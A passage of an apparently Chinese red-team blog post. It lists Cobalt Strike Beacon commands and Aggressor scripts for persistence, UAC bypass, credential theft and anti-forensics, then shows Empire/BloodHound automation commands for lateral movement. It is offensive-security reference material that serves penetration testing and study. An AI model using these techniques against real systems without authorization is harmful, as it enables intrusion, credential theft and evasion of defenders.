	为此Beacon分配注释</span><br><span class="line">persitence		为Bean添加或删除持久性功能</span><br><span class="line">portscan		扫描网络以获取开放服务</span><br><span class="line">powerpick		通过Unmanaged PowerShell执行命令</span><br><span class="line">powershell		通过powershell.exe执行命令</span><br><span class="line">powershell-import	导入powershell脚本</span><br><span class="line">ppid			为生成的post-ex作业设置父PID</span><br><span class="line">ps				显示进程列表</span><br><span class="line">psexec			使用服务在主机上生成会话</span><br><span class="line">psexec_psh		使用PowerShell在主机上生成会话</span><br><span class="line">psinject		在特定进程中执行PowerShell命令</span><br><span class="line">pth				使用Mimikatz传递哈希</span><br><span class="line">pwd				打印当前目录</span><br><span class="line">reg				查询注册表</span><br><span class="line">rename_msbuild		创建无辜的MSBuild.exe副本</span><br><span class="line">rev2self		恢复原始令牌</span><br><span class="line">rm				删除文件或文件夹</span><br><span class="line">rportfwd		向前设置反向端口</span><br><span class="line">run				在目标上执行程序（返回输出）</span><br><span class="line">runas			以另一个用户身份执行程序</span><br><span class="line">runasadmin		在高完整性上下文中执行程序</span><br><span class="line">runu				在另一个PID下执行程序</span><br><span class="line">screenshot		截取屏幕截图</span><br><span class="line">sendtoempire	将当前Beacon会话发送到已配置的Empire服务器</span><br><span class="line">setenv			设置环境变量</span><br><span class="line">shell			通过cmd.exe执行命令</span><br><span class="line">shinject		将shellcode注入进程</span><br><span class="line">shspawn			生成进程并将shellcode注入其中</span><br><span class="line">sleep			设置Bean睡眠时间</span><br><span class="line">socks			启动SOCKS4a服务器以中继流量</span><br><span class="line">socks stop		停止SOCKS4a服务器</span><br><span class="line">spawn			产生一个会话</span><br><span class="line">spawnto			设置可执行文件以生成进程</span><br><span class="line">spawnu			在另一个PID下产生一个会话</span><br><span class="line">ssh				使用SSH在主机上生成SSH会话</span><br><span class="line">ssh-key			使用SSH在主机上生成SSH会话</span><br><span class="line">steal_token		从进程中窃取访问令牌</span><br><span class="line">timestomp		将时间戳从一个文件应用到另一个文件</span><br><span class="line">type			显示文件的内容</span><br><span class="line">unlink			断开与父Beacon的连接</span><br><span class="line">upload			上传文件</span><br><span class="line">wimgest			使用mimikatz转储明文凭据</span><br><span class="line">winrm			使用WinRM在主机上生成会话</span><br><span class="line">wmi				使用WMI在主机上生成会话</span><br><span class="line">wmi_msbuild 	wmi横向运动没有powershell</span><br></pre></td></tr></table></figure>
<h4 id="一些好用的脚本"><a href="#一些好用的脚本" class="headerlink" title="一些好用的脚本"></a>一些好用的脚本</h4><blockquote>
<p>后续有时间再整理整理。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CertUtilWebDelivery.cna  </span><br><span class="line">Logging                       </span><br><span class="line">PowerLessShell        </span><br><span class="line">ProcessMonitor.ps1  </span><br><span class="line">SMBPayloadGenerator.cna</span><br><span class="line">ArtifactPayloadGenerator.cna </span><br><span class="line">DriverSearcher           </span><br><span class="line">logvis.cna                    </span><br><span class="line">PowerView3-Aggressor  </span><br><span class="line">UACBypass</span><br><span class="line">AVQuery.cna                   </span><br><span class="line">EDR.cna                  </span><br><span class="line">Persistence                   </span><br><span class="line">ProcessColor.cna     </span><br><span class="line">RedTeamRepo.cna     </span><br><span class="line">Beaconpire                    </span><br><span class="line">ElevateKit               </span><br><span class="line">persistence-aggressor-script  </span><br><span class="line">ProcessMonitor.cna    </span><br><span class="line">silver-tickets.cna</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/4WR9tTEc46Wr.png?imageslim" alt="mark"></p>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/0nCBot3LSOtW.png?imageslim" alt="mark"></p>
<ul>
<li><p>ArtifactPayloadGenerator.cna</p>
<ul>
<li>根据HTTP/HTTPS侦听器生成每种类型的无阶段/分阶段有效负载</li>
<li>创建/opt /cobaltstrike/Staged_Payloads，/opt/cobaltstrike/Stageless_Payloads</li>
</ul>
</li>
<li><p>AVQuery.cna</p>
<ul>
<li>使用PowerShell在目标上查询所有安装的AV，以查询注册表</li>
<li>快速简便地获取您作为攻击者处理的AV</li>
</ul>
</li>
<li><p>CertUtilWebDelivery.cna</p>
<ul>
<li>使用CertUtil.exe的无级Web传送</li>
<li>Powerpick用于生成certutil.exe以下载目标上的无阶段有效负载并使用rundll32.exe执行</li>
</ul>
<p><a href="https://user-images.githubusercontent.com/27856212/29992549-12d45854-8f6c-11e7-95c7-c2892582f56f.PNG" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/29992549-12d45854-8f6c-11e7-95c7-c2892582f56f.PNG" alt="certutil2"></a></p>
</li>
<li><p>RedTeamRepo.cna</p>
<ul>
<li>一个常见的操作系统命令集合，以及当您手头没有Google或RTFM时的红色团队提示。</li>
</ul>
</li>
<li><p>ProcessColor.cna</p>
<ul>
<li>彩色输出</li>
</ul>
</li>
</ul>
<h4 id="Red-Team-Persistence"><a href="#Red-Team-Persistence" class="headerlink" title="Red Team Persistence"></a><strong>Red Team Persistence</strong></h4><ul>
<li><p>UserSchtasksPersist.cna</p>
<ul>
<li>用户Schtasks作为所选Bean的当前用户运行的持久性</li>
<li>意味着在初始访问时快速用户级持久性</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449039/2b43a742-411e-11e7-8ac4-f003c8060654.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449039/2b43a742-411e-11e7-8ac4-f003c8060654.PNG" alt="的schtasks"></a></p>
</li>
<li><p>ServiceEXEPersist.cna</p>
<ul>
<li>管理级自定义服务EXE持久性</li>
<li>作为所选Bean的提升用户/ SYSTEM运行</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449045/2e4a13c2-411e-11e7-83e4-2b57babdbbdd.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449045/2e4a13c2-411e-11e7-83e4-2b57babdbbdd.PNG" alt="服务"></a></p>
</li>
<li><p>WMICEventPersist.cna</p>
<ul>
<li>使用WMIC为选定的Bean生成系统级别持久性的自定义WMI事件</li>
<li>语法很重，在使用实时目标之前首先测试</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/25680015/5eeab692-301d-11e7-8b85-914fe928e426.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/25680015/5eeab692-301d-11e7-8b85-914fe928e426.PNG" alt="wmic4"></a></p>
</li>
<li><p>WMIEventPersist.cna</p>
<ul>
<li>使用PowerShell为选定的Bean生成SYSTEM级别持久性的自定义WMI事件</li>
<li>语法很重，在使用实时目标之前首先测试</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449054/36d33172-411e-11e7-818d-7f0702a40712.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449054/36d33172-411e-11e7-818d-7f0702a40712.PNG" alt="wmipersist1"></a></p>
</li>
<li><p>StartupGPOPersist.cna</p>
<ul>
<li>在psscripts.ini中生成本地GPO条目，以调用.ps1脚本文件以在选定的Bean上保持持久性</li>
<li>以SYSTEM身份回拨</li>
<li>在执行之前首先使用GPO枚举（成功的GroupPolicy目录列表）检查权限</li>
<li>Bean执行将导致winlogon.exe挂起，最终用户无法登录。一旦新的Bean检入注入另一个进程并杀死原始。更新即将推出。</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449031/1ffb0aba-411e-11e7-9138-f23de966ac4b.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449031/1ffb0aba-411e-11e7-9138-f23de966ac4b.PNG" alt="GPO"></a></p>
</li>
<li><p>RegistryPersist.cna</p>
<ul>
<li>根据所选Bean的用户输入创建自定义注册表项，值，类型和有效负载位置</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449228/14f41a48-411f-11e7-8690-3ce3c1541738.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449228/14f41a48-411f-11e7-8690-3ce3c1541738.PNG" alt="注册处"></a></p>
</li>
<li><p>HKCURunKeyPSRegistryPersist.cna</p>
<ul>
<li>在HKCU中创建两个自定义注册表运行密钥条目</li>
<li>Payload是基于HTTP/HTTPS侦听器的base64编码的PowerShell有效负载</li>
</ul>
<p><a href="https://user-images.githubusercontent.com/27856212/28122833-5bee8d72-66ed-11e7-8d0b-332f32627c62.png" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/28122833-5bee8d72-66ed-11e7-8d0b-332f32627c62.png" alt="HKCU"></a></p>
</li>
<li><p>Bitsadmin.cna</p>
<ul>
<li>创建在重新引导时执行的bitsadmin作业</li>
<li>目前适用于Windows 7,8，Server 2008，Server 2012</li>
</ul>
<p><a href="https://user-images.githubusercontent.com/27856212/40030114-f1bb39d2-57a5-11e8-9b99-ea076a852503.png" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/40030114-f1bb39d2-57a5-11e8-9b99-ea076a852503.png" alt="位"></a></p>
</li>
</ul>
<h4 id="Kits-工具包"><a href="#Kits-工具包" class="headerlink" title="Kits 工具包"></a>Kits 工具包</h4><p>这里的大多数有用的脚本都是用<a href="https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits" target="_blank" rel="noopener">工具包</a>组织的。您所要做的就是加载<a href="https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits/KitLoader.cna" target="_blank" rel="noopener">KitLoader.cna</a>脚本，它将自动加载所有其他工具包（execpt DebugKit）。</p>
<ol>
<li><strong>AnnoyKit</strong></li>
</ol>
<p>此套件中的操作围绕杂项乐趣，通常涉及弄乱用户</p>
<ol>
<li><strong>AntiForensicsKit</strong>   </li>
</ol>
<p>该套件中的行动围绕抗辩护理。如果它减慢了调查员的速度，它很可能属于这个套件。我们都知道抗辩法是最好的取证。</p>
<ol>
<li><strong>CredKit</strong>  凭证获取</li>
</ol>
<p>此工具包中的操作围绕凭证窃取，无论是通过内存抓取还是读取文件。如果涉及窃取密码，则应该在此处。</p>
<ol>
<li><strong>DebugKit</strong></li>
</ol>
<p>此工具包仅限于我用于开发和调试的操作，因此不会加载其余部分。</p>
<ol>
<li><strong>EnumKit</strong></li>
</ol>
<p>此工具包中的操作围绕主机和网络枚举。凭证枚举操作应该使用CredKit。</p>
<ol>
<li><strong>PersistKit</strong>  </li>
</ol>
<p>此工具包中的操作围绕端点持久性。示例包括后门服务创建，后门进程创建等</p>
<ol>
<li><strong>PrivEscKit</strong>  提权</li>
</ol>
<p>此工具包中的操作围绕端点权限提升。涉及强制扫描的动作（powerup.ps1，unix-privesc-check）应该放在apporiate部分</p>
<ol>
<li><strong>ThirdParty</strong> 这只是其他人创建的.cna脚本的随机集合，我喜欢使用它们。我只是装载了kitloader以便于传送。可能会对第三方脚本进行更改，以便更好地与我的工作流程集成。</li>
</ol>
<h5 id="NoPowerShell"><a href="#NoPowerShell" class="headerlink" title="NoPowerShell"></a>NoPowerShell</h5><blockquote>
<p><a href="https://github.com/bitsadmin/nopowershell" target="_blank" rel="noopener">https://github.com/bitsadmin/nopowershell</a></p>
</blockquote>
<p>NoPowerShell是一个用C＃实现的工具，它支持执行类似PowerShell的命令，同时对任何PowerShell日志记录机制都不可见。可以在Cobalt Strike中加载此.NET Framework 2兼容二进制文件，以在内存中执行命令。不<code>System.Management.Automation.dll</code>使用; 只有原生的.NET库。</p>
<p>此外，该项目使每个人只需使用几行C＃代码即可轻松扩展其功能。</p>
<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><p><a href="https://github.com/tevora-threat/PowerView3-Aggressor" target="_blank" rel="noopener">https://github.com/tevora-threat/PowerView3-Aggressor</a></p>
<h5 id="BloodHound-联动插件"><a href="#BloodHound-联动插件" class="headerlink" title="BloodHound 联动插件"></a>BloodHound 联动插件</h5><p><a href="https://github.com/vysec/ANGRYPUPPY" target="_blank" rel="noopener">https://github.com/vysec/ANGRYPUPPY</a></p>
<h4 id="提权脚本"><a href="#提权脚本" class="headerlink" title="提权脚本"></a>提权脚本</h4><p>UAC Bypass</p>
<blockquote>
<p><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></p>
</blockquote>
<h5 id="在不调用powershell-exe的情况下运行PowerShell命令"><a href="#在不调用powershell-exe的情况下运行PowerShell命令" class="headerlink" title="在不调用powershell.exe的情况下运行PowerShell命令"></a>在不调用powershell.exe的情况下运行PowerShell命令</h5><blockquote>
<p><a href="https://github.com/Mr-Un1k0d3r/PowerLessShell" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/PowerLessShell</a></p>
</blockquote>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><blockquote>
<p><a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ms15-051</span><br><span class="line">ms16-016</span><br><span class="line">ms16-032：辅助登录句柄权限提升（CVE-2016-099）</span><br><span class="line">uac-eventvwr</span><br><span class="line">uac-wscript</span><br></pre></td></tr></table></figure>
<h4 id="UACME-BypassUAC的总结"><a href="#UACME-BypassUAC的总结" class="headerlink" title="UACME  BypassUAC的总结"></a>UACME  BypassUAC的总结</h4><blockquote>
<p><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></p>
<p><a href="http://www.freebuf.com/author/alphalab" target="_blank" rel="noopener">alphalab</a>  总结：白名单绕过UAC方法原理介绍 <a href="https://www.freebuf.com/vuls/183914.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/183914.html</a></p>
<p><a href="https://www.v2ex.com/t/358133?p=1" target="_blank" rel="noopener">https://www.v2ex.com/t/358133?p=1</a></p>
<p><a href="http://www.fuzzysecurity.com/tutorials/27.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/27.html</a></p>
</blockquote>
<p>原理：</p>
<ol>
<li>各类UAC白名单程序的DLL劫持</li>
<li>各类提升权限的COM接口利用</li>
</ol>
<ul>
<li><p>Akagi 也就是主要的Bin，其中包含了所有的Methods，绕过UAC的主要方法的源码都在Method目录下，会以UAC绕过方法的发现者的名字来命名源文件。</p>
</li>
<li><p>Akatsuki 又叫做“晓”，WOW64 logger绕过UAC的利用方法的DLL源码</p>
</li>
<li><p>Fubuki 又叫做“暴风雪“,好几个绕过UAC利用的代理DLL，他们都共用了劫持Ole32.dll的方法</p>
</li>
<li><p>Hibiki 又叫做“声音”，AVRF方法绕过UAC的利用方法的DLL源码</p>
</li>
<li><p>Ikazuchi 又叫做”雷声“，利用劫持 comctl32.dll 组件绕过UAC的利用方法的DLL源码</p>
</li>
<li><p>Inazuma 又叫做“闪电”，SHIM相关利用的绕过UAC的利用方法的EXE源码</p>
</li>
<li><p>Kamikaze 又叫做“神风”，未在工程文件中引用，MMC劫持方法利用的MSC文件</p>
</li>
<li><p>Kongou 又叫做“金刚”，利用Hybrid方法绕过UAC的Dll，已经排除在新工程中的引用了</p>
</li>
<li><p>Naka 又叫做“空气”，压缩及亦或编码的小工具源码</p>
</li>
<li><p>Yuubari Aka UACView用来查看相关UAC的设定信息，以及扫描存在可利用的程序的工具</p>
</li>
</ul>
<h2 id="工具联动"><a href="#工具联动" class="headerlink" title="工具联动"></a>工具联动</h2><h2 id="一些自动化工具"><a href="#一些自动化工具" class="headerlink" title="一些自动化工具"></a>一些自动化工具</h2><h3 id="Death-Star-自动化工具"><a href="#Death-Star-自动化工具" class="headerlink" title="Death Star 自动化工具"></a>Death Star 自动化工具</h3><blockquote>
<p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
<p><a href="https://www.youtube.com/watch?v=iMoFORL2fpQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=iMoFORL2fpQ</a></p>
</blockquote>
<p>基于Empire API，下拉agent，自动的使用Empire Api进行横向渗透、后渗透。</p>
<p>原理是作者博客上的那种图，一些常见的内网域渗透思路。</p>
<p>实验了下，还是挺自动化的。就是遍历一些常见的攻击方式。</p>
<h3 id="EmpireDog"><a href="#EmpireDog" class="headerlink" title="EmpireDog"></a>EmpireDog</h3><blockquote>
<p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
</blockquote>
<p>EmpireDog，是用powershell联动Empire、BloodHound的一套工具。</p>
<p>安装步骤：</p>
<ul>
<li><p>把github上四个文件夹下到 C:\Windows\System32\WindowsPowerShell\v1.0\Modules中。</p>
</li>
<li><p>分布Import-Modules </p>
</li>
<li><p>将CustomCypher.txt内容添加到BH Custom Queries / Map Empire</p>
</li>
</ul>
<blockquote>
<p>Get-Command -Module <em><modulename></modulename></em> | Get-Help -Examples</p>
</blockquote>
<p>基本流程：</p>
<p>Empire–&gt;PowerEmpire–&gt; DogStrike_–&gt;  CypherDog–&gt;BloodHound–&gt;权限</p>
<h4 id="第一步-Empire-API交互"><a href="#第一步-Empire-API交互" class="headerlink" title="第一步 Empire API交互"></a><strong>第一步 Empire API交互</strong></h4><p>PowerEmpire和EmpireStrike可与Empire服务器进行交互</p>
<p>通过帝国API。 PowerEmpire不需要EmpireStrike。 EmpireStrike是PowerEmpire上的一个包装器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./empire --headless --username *user* --password *password*</span><br><span class="line">./empire --rest --username *user* --password *password*</span><br></pre></td></tr></table></figure>
<h5 id="PowerEmpire"><a href="#PowerEmpire" class="headerlink" title="PowerEmpire"></a><strong>PowerEmpire</strong></h5><p>PowerEmpire是一个PowerShell模块，用于与Empire的API进行交互</p>
<p>特征</p>
<ul>
<li>27个与Empire Server交互的Cmdlet</li>
<li>通过会话控制多个服务器</li>
<li>用PowerShell做吧！</li>
</ul>
<p>Credits</p>
<p>PowerEmpire由DarkOperator编写（@Carlos_Perez）</p>
<p>更多信息</p>
<p><a href="https://gitlab.com/carlos_perez/PowerEmpire/wikis/home" target="_blank" rel="noopener">https://gitlab.com/carlos_perez/PowerEmpire/wikis/home</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">＃安装模块</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> UnRestricted</span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> PowerEmpire2.<span class="number">0</span>_DogMod</span><br><span class="line"></span><br><span class="line">＃连接到服务器</span><br><span class="line"></span><br><span class="line">New-EmpireSession    -ComputerName   &lt;IP&gt; -Credential &lt;用户名&gt; -NoSSLCheck</span><br><span class="line">New-EmpireSession    -ComputerName  <span class="number">192.168</span>.<span class="number">10.130</span> -Credential admin  -NoSSLCheck</span><br><span class="line">＃检查命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Command</span> -Module PowerEmpire2.<span class="number">0</span>_dogMod</span><br><span class="line"></span><br><span class="line"><span class="comment">#RTFM</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Help</span> *&lt;CommandName&gt;* -Full</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<p>导入EmpireStrike模块也将导入PowerEmpire并要求</p>
<p>初始服务器设置，所以你现在可以跳过这一切</p>
<h5 id="EmpireStrike"><a href="#EmpireStrike" class="headerlink" title="EmpireStrike"></a><strong>EmpireStrike</strong></h5><p>EmpireStrike是PowerEmpire的一个包装器，语法短。</p>
<p>EmpireStrike Cmdlet使用PowerEmpire命令。</p>
<p> 特征</p>
<ul>
<li>17个具有短语法的Cmdlet</li>
<li>Tab-Completion / Dynamic Params</li>
<li>管道输入/多个目标</li>
<li>ISE额外服务</li>
</ul>
<p>安装</p>
<p>导入EmpireStrike还将导入PowerEmpire。</p>
<p>命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import Module（也导入PowerEmpire2.0_DogMod）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> EmpireStrike2.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Session</span></span><br><span class="line"><span class="comment"># Check Current Session</span></span><br><span class="line">Session ?</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">## Agents</span></span><br><span class="line"><span class="comment"># Check selected agents</span></span><br><span class="line">Agent ?</span><br><span class="line"><span class="comment"># Agent list for current session</span></span><br><span class="line">Agent *</span><br><span class="line"><span class="comment"># Set agent</span></span><br><span class="line">Agent ABCDE123</span><br><span class="line"><span class="comment"># Check selected agent</span></span><br><span class="line">Agent ?</span><br><span class="line"><span class="comment"># More details</span></span><br><span class="line">Agent ??</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple Targets</span></span><br><span class="line">Agent * | CommandX <span class="string">'$env:COMPUTERNAME'</span></span><br><span class="line"><span class="comment"># Get Results</span></span><br><span class="line">Agent * | Result</span><br><span class="line"></span><br><span class="line"><span class="comment">## Modules</span></span><br><span class="line"><span class="comment"># Check selected module</span></span><br><span class="line">Module ?</span><br><span class="line"><span class="comment"># List all Modules</span></span><br><span class="line">Module *</span><br><span class="line"><span class="comment"># Search Module</span></span><br><span class="line">ModuleSearch wallpaper</span><br><span class="line"><span class="comment"># Set Module</span></span><br><span class="line">Module powershell/trollsploit/wallpaper</span><br><span class="line"><span class="comment"># or Combo</span></span><br><span class="line">Module (ModuleSearch wallpaper).name</span><br><span class="line"><span class="comment"># Check options for selected module</span></span><br><span class="line">Option ?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># With description</span></span><br><span class="line">Option *</span><br><span class="line"><span class="comment"># Set option</span></span><br><span class="line">Option LocalImagePath <span class="string">"/root/Pictures/wallpapers/wllppr.jpg"</span></span><br><span class="line"><span class="comment"># Check options</span></span><br><span class="line">Option ?</span><br><span class="line"><span class="comment">## Strike</span></span><br><span class="line"><span class="comment"># View Strike Details</span></span><br><span class="line">Strike ?</span><br><span class="line"><span class="comment"># Strike</span></span><br><span class="line">Strike</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple Targets</span></span><br><span class="line"><span class="comment"># Change wallpaper to all agents in selected session</span></span><br><span class="line">Session <span class="number">0</span></span><br><span class="line">Module (ModuleSearch wallpaper).name</span><br><span class="line">Option LocalImagePath <span class="string">'/root/Pictures/wallpapers/wllppr.jpg'</span></span><br><span class="line">Agent * | StrikeX</span><br><span class="line"><span class="comment">## RTFM</span></span><br><span class="line"><span class="comment"># More Stuff...</span></span><br><span class="line"><span class="built_in">Get-command</span> -Module EmpireStrike2.<span class="number">0</span> | <span class="built_in">Get-Help</span> | select Name,Synopsis</span><br><span class="line"><span class="comment"># Examples</span></span><br><span class="line"><span class="built_in">Get-Help</span> &lt;CommandName&gt; -Examples</span><br></pre></td></tr></table></figure>
<p><a href="https://www.youtube.com/watch?v=eok_NgFOnmc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=eok_NgFOnmc</a></p>
<h4 id="第二部-与BloodHound-API交互"><a href="#第二部-与BloodHound-API交互" class="headerlink" title="第二部- 与BloodHound API交互"></a><strong>第二部- 与BloodHound API交互</strong></h4><h5 id="CypherDog"><a href="#CypherDog" class="headerlink" title="CypherDog"></a><strong>CypherDog</strong></h5><p>CypherDog是一个用于将Cypher查询发送到BloodHound API的模块。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Import Module</span><br><span class="line">Import-Module CypherDog1.3</span><br><span class="line"><span class="meta">#</span> Query Node</span><br><span class="line">Node -User ACHAVARIN@EXTERNAL.LOCAL</span><br><span class="line">NodeSearch -Computer Secret</span><br><span class="line"><span class="meta">#</span> Query Edge</span><br><span class="line">Edge -MemberOfGroup CONTRACTINGI@INTERNAL.LOCAL -Return Users</span><br><span class="line">Edge -MemberOfGroup CONTRACTINGI@INTERNAL.LOCAL -Return Users -Degree *</span><br><span class="line"><span class="meta">#</span> Pipeline Combo</span><br><span class="line">Edge -AdminToComputer APOLLO.EXTERNAL.LOCAL -Return Groups |</span><br><span class="line">Edge -MemberOfGroup -Return Users | measure</span><br><span class="line">Edge -AdminToComputer APOLLO.EXTERNAL.LOCAL -Return Groups |</span><br><span class="line">Edge -MemberOfGroup -Return Users -degree * | measure</span><br><span class="line"><span class="meta">#</span> Query Edge Reverse</span><br><span class="line">EdgeR -ParentOfUser ACHAVARIN@EXTERNAL.LOCAL -Return Groups</span><br><span class="line"><span class="meta">#</span> Query Path</span><br><span class="line">Path -UserToGroup -From ACHAVARIN@EXTERNAL.LOCAL -To `</span><br><span class="line">'DOMAIN ADMINS@INTERNAL.LOCAL'</span><br><span class="line"><span class="meta">#</span># RTFM &gt;&gt; Create/Delete/Update Nodes/Edges</span><br><span class="line"><span class="meta">#</span> List all Module Commands</span><br><span class="line">Get-command -Module CypherDog1.3 | Get-Help | Select Name,Synopsis</span><br><span class="line"><span class="meta">#</span> Get Help for specific command</span><br><span class="line">Get-Help &lt;CommandName&gt; -full</span><br></pre></td></tr></table></figure>
<p>视频</p>
<p><a href="https://www.youtube.com/watch?v=SPgkgeOY40Y" target="_blank" rel="noopener">https://www.youtube.com/watch?v=SPgkgeOY40Y</a></p>
<h4 id="第三部-联动BloodHound和Empire"><a href="#第三部-联动BloodHound和Empire" class="headerlink" title="第三部 联动BloodHound和Empire"></a><strong>第三部 联动BloodHound和Empire</strong></h4><h5 id="DogStrike"><a href="#DogStrike" class="headerlink" title="DogStrike"></a><strong>DogStrike</strong></h5><p>DogStrike是一系列用于协调的cmdlet</p>
<p>BloodHound / Empire，使用PowerEmpire / EmpireStrike / CypherDog的cmdlet。</p>
<p>还包括自定义密码查询，以将帝国图形化为BloodHound中的节点。</p>
<p>特征</p>
<ul>
<li>自动映射帝国和图表+循环更新显示</li>
<li>自动提升/生成/传播代理</li>
<li>自动清洁会话/图表（陈旧）</li>
</ul>
<p>- <strong>DIY框架</strong></p>
<p>使用PowerShell作为攻击性自动化框架……</p>
<p>命令</p>
